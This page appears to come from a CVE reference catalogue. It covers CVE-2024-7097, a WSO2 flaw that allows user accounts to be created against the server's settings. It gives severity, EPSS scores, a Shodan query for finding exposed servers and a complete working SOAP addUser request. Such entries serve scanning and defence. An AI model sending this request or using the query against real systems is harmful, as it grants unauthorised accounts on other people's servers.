_cves/cve-2024-7097.md

---
layout: "post"
cve_id: "CVE-2024-7097"
title: "WSO2 User Registration - Arbitrary Account Creation"
pcap: true
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-7097.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "medium"
reference: ['https://sec.vnpt.vn/2025/01/canh-bao-lo-hong-nghiem-trong-tren-nen-tang-xac-thuc-tap-trung-wso2-anh-huong-den-nhieu-co-quan-to-chuc-bo-ban-nganh/', 'https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3574/']
classification:
  epss-score: "0.09908"
  epss-percentile: "0.92709"
metadata:
  verified: "True"
  max-request: "2"
  shodan-query: "WSO2 Carbon Server"
tags: ['cve', 'cve2024', 'wso2', 'intrusive', 'auth-bypass', 'vkev', 'vuln']
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
The SOAP admin service in WSO2 products has a security vulnerability that allows the creation of new user accounts regardless of the self-registration configuration settings.


## 🌐 HTTP Request
<pre style="background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto;">
POST /services/UserRegistrationAdminService.UserRegistrationAdminServiceHttpsSoap11Endpoint/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Safari/605.1.15
Connection: close
Content-Length: 401
Content-Type: text/xml
SOAPAction: "urn:addUser"
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://org.apache.axis2/xsd">
   <soapenv:Header/>
   <soapenv:Body>
      <xsd:addUser>
<xsd:user>
         <xsd:userName>36KG3KcJ457YcT0xf5kVwCYW32M</xsd:userName>
         <xsd:password>36KG3JEaqiqcOOjZfAIZbwUhNXC</xsd:password>
</xsd:user>
      </xsd:addUser>
   </soapenv:Body>
</soapenv:Envelope>
</pre>
